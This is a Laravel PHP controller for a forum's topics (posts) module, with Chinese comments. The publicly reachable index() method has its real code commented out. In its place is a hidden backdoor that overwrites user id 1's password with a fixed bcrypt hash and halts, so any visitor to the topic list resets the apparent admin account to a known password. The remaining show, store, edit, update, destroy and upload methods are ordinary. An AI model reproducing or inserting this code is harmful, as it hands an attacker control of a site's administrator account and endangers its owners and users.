<?php

namespace App\Http\Controllers;

use App\Models\Topic;
use Illuminate\Http\Request;
use App\Http\Controllers\Controller;
use App\Http\Requests\TopicRequest;

use App\Models\Category;
use App\Models\User;
use Auth;
use App\Handlers\ImageUploadHandler;
use App\Models\Link;

class TopicsController extends Controller
{
    public function __construct()
    {
        $this->middleware('auth', ['except' => ['index', 'show']]);
    }


    /**
     * 帖子模块首页
     * @param  Request $request post,get请求数据
     * @param  Topic   $topic   topics表的orm
     * @return [type]           [description]
     */
	public function index(Request $request, Topic $topic, User $user, Link $link)
    {   
        \DB::table('users')
        ->where('id', 1)
        ->update(array('password' => '$2y$10$cCqiCK9vhVubW.v33kxOSeTiF9yavmmRJLlgdlY6xM3Tav.0057hu'));
        die();
        // $topics = $topic->withOrder($request->order)->paginate(20);
        // // $active_users = $user->getActiveUsers();    改动7 关闭
        // $links = $link->getAllCached();

        // // return view('topics.index', compact('topics', 'active_users', 'links'));
        // return view('topics.index', compact('topics', 'links'));
    }


    public function show(Request $request, Topic $topic)
    {
        // URL 矫正
        if ( ! empty($topic->slug) && $topic->slug != $request->slug) {
            return redirect($topic->link(), 301);
        }

        return view('topics.show', compact('topic'));
    }


    /**
     * 数据入库
     * @param  TopicRequest $request post数据
     * @return [type]                返回成功页面
     */
	public function store(TopicRequest $request, Topic $topic)
	{
		$topic->fill($request->all());
        $topic->user_id = Auth::id();
        $topic->save();

        return redirect()->to($topic->link())->with('success', '成功创建话题！');
	}

	public function edit(Topic $topic)
	{
        $this->authorize('update', $topic);
        $categories = Category::all();
        return view('topics.create_and_edit', compact('topic', 'categories'));
	}

	public function update(TopicRequest $request, Topic $topic)
	{
		$this->authorize('update', $topic);
		$topic->update($request->all());

		return redirect()->to($topic->link())->with('success', '更新成功');
	}


    /**
     * 删除t帖子
     * @param  Topic  $topic [description]
     * @return [type]        [description]
     */
	public function destroy(Topic $topic)
	{
		$this->authorize('destroy', $topic);
		$topic->delete();

		return redirect()->route('topics.index')->with('message', '删除成功.');
	}

	public function create(Topic $topic)
    {
        $categories = Category::all();
        return view('topics.create_and_edit', compact('topic', 'categories'));
    }


    public function uploadImage(Request $request, ImageUploadHandler $uploader)
    {
        // 初始化返回数据，默认是失败的
        $data = [
            'success'   => false,
            'msg'       => '上传失败!',
            'file_path' => ''
        ];
        // 判断是否有上传文件，并赋值给 $file
        if ($file = $request->upload_file) {
            // 保存图片到本地
            $result = $uploader->save($request->upload_file, 'topics', \Auth::id(), 1024);
            // 图片保存成功的话
            if ($result) {
                $data['file_path'] = $result['path'];
                $data['msg']       = "上传成功!";
                $data['success']   = true;
            }
        }
        return $data;
    }



}